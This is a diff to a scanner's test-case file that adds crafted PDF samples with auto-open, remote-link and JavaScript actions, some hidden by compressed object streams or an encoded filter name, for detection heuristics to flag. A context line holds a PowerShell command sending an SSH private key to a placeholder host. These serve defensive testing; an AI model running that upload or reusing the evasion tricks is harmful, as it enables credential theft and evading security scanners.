@@ -12,6 +12,7 @@ import shutil
 import struct
 import tempfile
 import zipfile
+import zlib
 from pathlib import Path
 
 from yara_gate.samples import mini_pe
@@ -25,6 +26,36 @@ def _zip(name: str, payload: bytes) -> bytes:
     with zipfile.ZipFile(output, "w") as archive:
         archive.writestr(name, payload)
     return output.getvalue()
+
+
+def _objstm_pdf(catalog: bytes, action: bytes) -> bytes:
+    """A PDF 1.5 object stream holding object 1 (``catalog``) and object 5 (``action``)."""
+    _, _, body = catalog.partition(b" 0 ")
+    header = b"1 0 5 " + str(len(body) + 1).encode() + b"\n"
+    packed = zlib.compress(header + body + b"\n" + action + b"\n")
+    return (
+        b"%PDF-1.5\n7 0 obj\n<< /Type /ObjStm /N 2 /First "
+        + str(len(header)).encode()
+        + b" /Filter /FlateDecode /Length "
+        + str(len(packed)).encode()
+        + b" >>\nstream\n"
+        + packed
+        + b"\nendstream\nendobj\n%%EOF\n"
+    )
+
+
+def _flate_object(body: bytes, dictionary: bytes) -> bytes:
+    """One compressed object stream holding ``body`` under the given stream dictionary."""
+    packed = zlib.compress(body)
+    return (
+        b"%PDF-1.5\n7 0 obj\n<< "
+        + dictionary
+        + b" /Length "
+        + str(len(packed)).encode()
+        + b" >>\nstream\n"
+        + packed
+        + b"\nendstream\nendobj\n%%EOF\n"
+    )
 
 
 def _dangerous_pickle() -> bytes:
@@ -266,6 +297,51 @@ def cases() -> list[tuple[str, bytes, str | None]]:
             "upload.ps1",
             b"iwr https://example.invalid/u -Method Post -InFile $HOME\\.ssh\\id_ed25519\n",
             "script_credential_upload",
+        ),
+        (
+            "open_page.pdf",
+            b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction 5 0 R >>\nendobj\n"
+            b"5 0 obj\n[3 0 R /FitH 700]\nendobj\n%%EOF\n",
+            "heuristic_pdf_OpenAction_goto",
+        ),
+        (
+            # pdfTeX style: the catalog and its GoTo action both live in a compressed object stream.
+            "open_objstm.pdf",
+            _objstm_pdf(
+                b"1 0 << /Type /Catalog /OpenAction 5 0 R >>", b"<< /S /GoTo /D [3 0 R /Fit] >>"
+            ),
+            "heuristic_pdf_OpenAction_goto",
+        ),
+        (
+            "open_objstm_uri.pdf",
+            _objstm_pdf(
+                b"1 0 << /Type /Catalog /OpenAction 5 0 R >>",
+                b"<< /S /URI /URI (https://example.invalid/) >>",
+            ),
+            "heuristic_pdf_OpenAction",
+        ),
+        # A nested /DecodeParms dictionary or a #xx-encoded filter name must not hide a stream.
+        (
+            "flate_decodeparms.pdf",
+            _flate_object(
+                b"1 0\n1 0 << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>",
+                b"/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /DecodeParms << /Columns 1 >>",
+            ),
+            "heuristic_pdf_JavaScript",
+        ),
+        (
+            "flate_encoded_filter.pdf",
+            _flate_object(
+                b"1 0\n1 0 << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>",
+                b"/Type /ObjStm /N 1 /First 4 /Filter /Fl#61teDecode",
+            ),
+            "heuristic_pdf_JS",
+        ),
+        (
+            "open_remote.pdf",
+            b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /OpenAction "
+            b"<< /S /GoToR /F (other.pdf) /D [0 /Fit] >> >>\nendobj\n%%EOF\n",
+            "heuristic_pdf_OpenAction",
         ),
     ]
 
